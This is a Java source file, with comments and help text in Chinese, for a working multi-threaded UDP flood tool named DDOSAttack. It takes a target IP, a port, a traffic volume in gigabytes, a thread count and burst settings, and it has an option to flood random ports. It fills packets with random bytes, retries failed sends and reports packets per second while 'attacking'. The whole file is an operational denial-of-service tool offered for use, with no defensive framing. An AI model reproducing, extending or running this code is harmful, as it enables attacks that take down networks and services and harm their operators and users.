import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.DatagramChannel;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.LongAdder;

/**
 *
 * 用法示例：
 *   java DDOSAttack -t 192.168.1.100 -p 53 -g 1 -P 4 -b 50
 *   java DDOSAttack -t 10.0.0.1 -p 80 -g 0.5 -P 8 --random-port -d 30
 *
 * 参数说明：
 *   -t, --target        目标 IP 地址（必填）
 *   -p, --port          目标 UDP 端口（必填）
 *   -g, --gb            总流量（GB，必填）
 *   -P, --processes     线程数（默认 4）
 *   -b, --burst         每突发包数（默认 50）
 *   -r, --rate          速率限制（秒/突发，默认 0 不限速）
 *   -d, --duration      持续时间（秒，默认 0 直到发完）
 *   -s, --src-port      源端口基数（默认 -1 随机）
 *   --size              包大小（字节，默认 1490）
 *   --random-port       随机目标端口
 *   --log               日志文件路径
 *   --max-retries       最大重试次数（默认 3）
 */
public class DDOSAttack {
    // ---------- 共享统计 ----------
    private static final LongAdder totalSent = new LongAdder();
    private static final LongAdder totalBytes = new LongAdder();
    private static final LongAdder totalDropped = new LongAdder();
    private static volatile boolean stopFlag = false;

    // ---------- 配置 ----------
    private static String targetIP;
    private static int targetPort;
    private static long totalPackets;
    private static int packetSize = 1490;
    private static int numThreads = 4;
    private static int burstSize = 50;
    private static double rateLimit = 0.0;
    private static int duration = 0;
    private static int srcPortBase = -1;
    private static boolean randomTargetPort = false;
    private static String logFile = null;
    private static int maxRetries = 3;

    private static PrintWriter logWriter = null;

    // ---------- 预分配 SocketAddress 数组 ----------
    private static InetSocketAddress[] portAddresses;

    // ===================================================================
    // 主函数
    // ===================================================================
    public static void main(String[] args) throws Exception {
        // 1. 解析参数（无参数则显示帮助）
        if (args.length == 0) {
            printUsage();
            System.exit(0);
        }
        parseArgs(args);

        // 2. 日志
        if (logFile != null) {
            try {
                logWriter = new PrintWriter(new FileWriter(logFile, true));
            } catch (IOException e) {
                System.err.println("[!] 无法打开日志文件: " + e.getMessage());
            }
        }

        // 3. 验证目标
        try {
            InetAddress.getByName(targetIP);
        } catch (UnknownHostException e) {
            System.err.println("[!] 无效的目标 IP: " + targetIP);
            System.exit(1);
        }
        if (targetPort < 1 || targetPort > 65535) {
            System.err.println("[!] 端口超出范围: " + targetPort);
            System.exit(1);
        }
        if (packetSize < 64) packetSize = 64;
        if (packetSize > 65507) packetSize = 65507;
        if (totalPackets <= 0) {
            System.err.println("[!] 总包数必须大于 0");
            System.exit(1);
        }

        // 4. 预分配地址数组
        if (randomTargetPort) {
            portAddresses = new InetSocketAddress[65536];
            for (int i = 1; i <= 65535; i++) {
                portAddresses[i] = new InetSocketAddress(targetIP, i);
            }
        }

        // 5. 一行摘要输出
        System.out.printf("[+] target=%s:%d  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%n",
                targetIP, targetPort, (double) totalPackets * packetSize / (1024.0 * 1024 * 1024),
                totalPackets, numThreads, packetSize,
                randomTargetPort ? "  random-port" : "");
        System.out.println("[+] attacking... (Ctrl+C to stop)");

        // 6. 注册关闭钩子（Ctrl+C 停止）
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            stopFlag = true;
        }));

        // 7. 准备载荷
        byte[] payload = new byte[packetSize];
        new Random().nextBytes(payload);

        // 8. 开始攻击
        long startTime = System.currentTimeMillis();
        startAttack(payload);
        long elapsed = System.currentTimeMillis() - startTime;

        // 9. 结束统计
        long finalSent = totalSent.longValue();
        long finalBytes = totalBytes.longValue();
        long finalDropped = totalDropped.longValue();
        double rate = elapsed > 0 ? finalSent / (elapsed / 1000.0) : 0;

        System.out.printf("%n[=] done: %d pkts sent, %d dropped, %.4f GB, %.2fs, %.1f pps%n",
                finalSent, finalDropped, finalBytes / (1024.0 * 1024 * 1024),
                elapsed / 1000.0, rate);

        if (logWriter != null) {
            logWriter.printf("done: sent=%d dropped=%d bytes=%d time=%.2fs rate=%.1fpps%n",
                    finalSent, finalDropped, finalBytes, elapsed / 1000.0, rate);
            logWriter.close();
        }
    }

    // ===================================================================
    // 用法帮助
    // ===================================================================
    private static void printUsage() {
        System.out.println("用法: java DDOSAttack -t <IP> -p <PORT> -g <GB> [选项]");
        System.out.println();
        System.out.println("必填参数:");
        System.out.println("  -t, --target        目标 IP 地址");
        System.out.println("  -p, --port          目标 UDP 端口");
        System.out.println("  -g, --gb            总流量（GB）");
        System.out.println();
        System.out.println("可选参数:");
        System.out.println("  -P, --processes     线程数（默认 4）");
        System.out.println("  -b, --burst         每突发包数（默认 50）");
        System.out.println("  -r, --rate          速率限制（秒/突发，默认 0）");
        System.out.println("  -d, --duration      持续时间（秒，默认 0 直到发完）");
        System.out.println("  -s, --src-port      源端口基数（默认 -1 随机）");
        System.out.println("      --size          包大小（字节，默认 1490）");
        System.out.println("      --random-port   随机目标端口");
        System.out.println("      --log <file>    日志文件路径");
        System.out.println("      --max-retries   最大重试次数（默认 3）");
        System.out.println("  -h, --help          显示本帮助");
        System.out.println();
        System.out.println("示例:");
        System.out.println("  java DDOSAttack -t 192.168.1.100 -p 53 -g 1 -P 4 -b 50");
        System.out.println("  java DDOSAttack -t 10.0.0.1 -p 80 -g 0.5 -P 8 --random-port -d 30");
    }

    // ===================================================================
    // 参数解析
    // ===================================================================
    private static void parseArgs(String[] args) {
        Map<String, String> params = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            if (args[i].startsWith("-")) {
                if (i + 1 < args.length && !args[i + 1].startsWith("-")) {
                    params.put(args[i], args[i + 1]);
                    i++;
                } else {
                    params.put(args[i], "true");
                }
            }
        }

        if (params.containsKey("-h") || params.containsKey("--help")) {
            printUsage();
            System.exit(0);
        }

        targetIP = params.getOrDefault("-t", params.get("--target"));
        if (targetIP == null) {
            System.err.println("[!] 缺少 -t/--target");
            System.exit(1);
        }

        String portStr = params.getOrDefault("-p", params.get("--port"));
        if (portStr == null) {
            System.err.println("[!] 缺少 -p/--port");
            System.exit(1);
        }
        targetPort = Integer.parseInt(portStr);

        String gbStr = params.getOrDefault("-g", params.get("--gb"));
        if (gbStr == null) {
            System.err.println("[!] 缺少 -g/--gb");
            System.exit(1);
        }
        double gb = Double.parseDouble(gbStr);

        if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
        if (params.containsKey("-T")) numThreads = Integer.parseInt(params.get("-T"));
        if (params.containsKey("-b")) burstSize = Integer.parseInt(params.get("-b"));
        if (params.containsKey("-r")) rateLimit = Double.parseDouble(params.get("-r"));
        if (params.containsKey("-d")) duration = Integer.parseInt(params.get("-d"));
        if (params.containsKey("-s")) srcPortBase = Integer.parseInt(params.get("-s"));
        if (params.containsKey("--size")) packetSize = Integer.parseInt(params.get("--size"));
        if (params.containsKey("--random-port")) randomTargetPort = true;
        if (params.containsKey("--log")) logFile = params.get("--log");
        if (params.containsKey("--max-retries")) maxRetries = Integer.parseInt(params.get("--max-retries"));

        if (gb <= 0) {
            System.err.println("[!] GB 必须大于 0");
            System.exit(1);
        }
        totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
        if (totalPackets <= 0) {
            System.err.println("[!] 流量太小");
            System.exit(1);
        }
    }

    // ===================================================================
    // 重试逻辑
    // ===================================================================
    private static boolean sendWithRetry(DatagramChannel channel, ByteBuffer buffer,
                                         SocketAddress target, int maxRetries) {
        int attempts = 0;
        while (attempts < maxRetries) {
            try {
                buffer.clear();
                int written = channel.send(buffer, target);
                if (written > 0) return true;
            } catch (IOException e) {
                // 忽略，继续重试
            }
            attempts++;
        }
        return false;
    }

    // ===================================================================
    // 攻击主体
    // ===================================================================
    private static void startAttack(byte[] payload) throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long packetsPerThread = totalPackets / numThreads;
        long extra = totalPackets % numThreads;

        for (int i = 0; i < numThreads; i++) {
            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
            int threadId = i;
            Runnable task = () -> {
                ThreadLocalRandom random = ThreadLocalRandom.current();
                try (DatagramChannel channel = DatagramChannel.open()) {
                    channel.configureBlocking(true);
                    InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);

                    if (srcPortBase >= 0) {
                        int srcPort = srcPortBase + threadId;
                        DatagramSocket socket = channel.socket();
                        try {
                            socket.bind(new InetSocketAddress(srcPort));
                        } catch (BindException e) {
                            System.err.println("[!] 线程 " + threadId + ": 绑定端口 " + srcPort + " 失败");
                        }
                    }

                    ByteBuffer buffer = ByteBuffer.wrap(payload);
                    long sent = 0;
                    long bytesSent = 0;
                    long dropped = 0;
                    long lastSent = 0, lastBytes = 0, lastDropped = 0;

                    while (!stopFlag && sent < pktCount) {
                        int toSend = (int) Math.min(burstSize, pktCount - sent);
                        for (int j = 0; j < toSend; j++) {
                            if (stopFlag || sent >= pktCount) break;

                            InetSocketAddress targetAddr;
                            if (randomTargetPort) {
                                int port = random.nextInt(1, 65536);
                                targetAddr = portAddresses[port];
                            } else {
                                targetAddr = dest;
                            }

                            if (sendWithRetry(channel, buffer, targetAddr, maxRetries)) {
                                sent++;
                                bytesSent += packetSize;
                            } else {
                                dropped++;
                            }
                        }

                        // 增量更新全局统计
                        long dSent = sent - lastSent;
                        long dBytes = bytesSent - lastBytes;
                        long dDropped = dropped - lastDropped;
                        if (dSent > 0) totalSent.add(dSent);
                        if (dBytes > 0) totalBytes.add(dBytes);
                        if (dDropped > 0) totalDropped.add(dDropped);
                        lastSent = sent;
                        lastBytes = bytesSent;
                        lastDropped = dropped;

                        if (rateLimit > 0) {
                            Thread.sleep((long) (rateLimit * 1000));
                        }
                    }

                    // 最后一次增量更新
                    long dSent = sent - lastSent;
                    long dBytes = bytesSent - lastBytes;
                    long dDropped = dropped - lastDropped;
                    if (dSent > 0) totalSent.add(dSent);
                    if (dBytes > 0) totalBytes.add(dBytes);
                    if (dDropped > 0) totalDropped.add(dDropped);

                } catch (Exception e) {
                    System.err.println("[!] 线程 " + threadId + " 错误: " + e.getMessage());
                }
            };
            futures.add(executor.submit(task));
        }

        // ---------- 进度监控 ----------
        long start = System.currentTimeMillis();
        long lastReportTime = start;
        long lastReportSent = 0;

        while (!stopFlag) {
            long now = System.currentTimeMillis();
            long elapsed = now - start;
            long sent = totalSent.longValue();
            long bytes = totalBytes.longValue();
            long dropped = totalDropped.longValue();

            if (sent >= totalPackets) break;

            if (duration > 0 && elapsed / 1000 >= duration) {
                stopFlag = true;
                break;
            }

            // 每 1 秒输出一行简短统计
            if (now - lastReportTime >= 1000) {
                long deltaSent = sent - lastReportSent;
                double deltaTime = (now - lastReportTime) / 1000.0;
                double instantRate = deltaSent / deltaTime;
                double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
                double dataGB = bytes / (1024.0 * 1024 * 1024);
                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d%n",
                        sent, dataGB, rate, instantRate, dropped);
                if (logWriter != null) {
                    logWriter.printf("sent=%d data=%.4fGB rate=%.0fpps drop=%d%n",
                            sent, dataGB, rate, dropped);
                    logWriter.flush();
                }
                lastReportTime = now;
                lastReportSent = sent;
            }

            Thread.sleep(100);
        }

        // 等待所有线程结束
        stopFlag = true;
        for (Future<?> f : futures) {
            try { f.get(); } catch (Exception ignored) {}
        }

        executor.shutdown();
        try {
            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }
    }
}
